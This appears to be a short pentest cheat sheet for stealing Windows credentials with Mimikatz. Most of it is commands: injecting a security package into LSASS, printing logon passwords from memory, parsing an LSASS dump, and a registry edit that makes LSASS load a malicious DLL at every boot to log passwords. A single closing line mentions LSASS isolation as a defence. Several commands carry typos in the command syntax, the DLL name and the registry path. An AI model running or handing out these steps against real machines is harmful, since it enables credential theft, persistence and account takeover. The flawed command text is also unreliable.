Understanding passwords, credential and authentication on Windows environment

# Mimikatz
Extracting passwords from memory by injecting LSASS process
```mimikatz
privilege::debug
token::elevate
misc:memssp
```
Report with credentials will appear on 
- mimilsa.log
# Mimikatz revealing passwords memor
The below commnand will show the password on the terminal, without leading to any files being created. 
```
privilege::debug
token::elevate
sekurlsa::logonpasswords
```
<div style="page-break-after: always;"></div>
# Mimikatz reading a dump file
If we are oppening a LSASS dump file to extract credentials run like the below.
To see various ways to dump LSASS [follow the link to medium](https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf)
```
sekurlsa::minidump DUMPFILENAME
“sekurlsa::LogonPasswords”
```

# Mimikats and minilib.dll
Another way to inject the lsass process is to force it to load our .dll during boo up time.
1st Move the minilib.dll to C:\Windows\System32

2nd Next run the below to add the file to be run by the lsass process
```
reg add "hklm\system\curentcontrolset\control\lsa" /v "Security Packages" /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0minilib" /t REG_MULTI_SZ
```
3rd Reboot the computer, next logo the LSASS process will load our malicious minilib.dll
4th The report for the credentials will appear on
- kiwissp.log
## Defending against minilib.dll
We can implement LSASS isolation, to stop it from loading unwanted .dlls